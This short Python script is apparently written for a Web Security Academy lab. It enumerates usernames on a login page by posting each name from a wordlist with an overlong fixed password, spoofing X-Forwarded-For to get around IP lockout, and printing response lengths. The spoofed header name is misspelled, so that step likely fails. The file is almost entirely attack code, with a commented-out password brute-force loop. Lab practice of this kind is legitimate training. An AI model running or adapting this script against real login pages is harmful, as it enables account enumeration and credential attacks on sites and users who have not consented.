#!/usr/bin/python3
from urllib import response
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = 'https://0a5400b603dc36ffc102a650007d0098.web-security-academy.net/login'

for num in range(0,100,1):

    headers = {"X-Forwareded-For": str(num)}



    file1 = open('/home/kali/user_name.txt','r')

    file2 = open('/home/kali/password.txt','r')

    for user in file1.readlines():

        username = user.strip("\n")

        # for password in file2.readlines():

        password = 12345555555555555555555555555555555555555555555555555555555555555555555555555555

        data = {'username':username, 'password':password, "Log in":'submit'}

        send_data_url = requests.post(url, data=data,headers=headers,proxies=proxies,verify=False)

        print(len(send_data_url.content))

        

    


    





    
